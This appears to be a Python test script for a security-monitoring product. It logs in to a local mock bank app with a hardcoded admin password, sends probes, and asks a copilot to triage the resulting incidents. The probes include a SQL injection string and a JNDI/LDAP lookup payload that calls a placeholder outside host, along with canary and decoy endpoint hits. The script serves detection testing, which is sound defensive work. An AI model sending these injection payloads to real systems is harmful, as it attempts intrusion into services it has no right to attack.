"""Small live-model spot check after the offline bank load benchmark."""

# ruff: noqa: INP001

from __future__ import annotations

import asyncio
import json

import httpx2


async def main() -> None:
    async with httpx2.AsyncClient(base_url="http://127.0.0.1:8003", timeout=90.0) as client:
        login = await client.post("/auth/login", json={"email": "admin@terminus.local", "password": "Password123!"})
        login.raise_for_status()
        headers = {"Authorization": "Bearer " + login.json()["session_token"]}
        orgs = await client.get("/orgs", headers=headers)
        orgs.raise_for_status()
        headers["X-Org-ID"] = orgs.json()[0]["org_id"]
        probes = [
            ("sqli", "GET", "/bank/api/search", {"q": "' OR '1'='1' --"}),
            ("jndi", "GET", "/bank/api/search", {"q": "${jndi:ldap://example.invalid/probe}"}),
            ("canary", "GET", "/bank/api/admin/treasury-keys", None),
            ("decoy_export", "GET", "/bank/api/customers/export", None),
        ]
        results = []
        for name, method, path, data in probes:
            response = await (client.get(path, params=data, headers=headers) if method == "GET" else client.post(path, json=data, headers=headers))
            response.raise_for_status()
            results.append({"probe": name, "http_status": response.status_code, "application_status": response.json().get("status")})
        incidents = await client.get("/incidents", headers=headers)
        incidents.raise_for_status()
        tickets = incidents.json()
        reply = await client.post("/copilot/chat", headers=headers, json={"prompt": "Prioritize the incidents in this local bank exercise. Which events show an exploit blocked at search, which are decoy access, and was any host isolation or IP blocking actually executed? Cite incident IDs and do not label 127.0.0.1 a real external attacker."})
        reply.raise_for_status()
        answer = reply.json()
        print(json.dumps({
            "probes": results,
            "incidents": len(tickets),
            "incident_ids": [ticket["id"] for ticket in tickets],
            "mitigation_statuses": sorted({ticket.get("mitigation_status") for ticket in tickets}),
            "copilot_tools": answer.get("tools_consulted"),
            "copilot_answer": answer.get("response"),
        }, indent=2))


if __name__ == "__main__":
    asyncio.run(main())
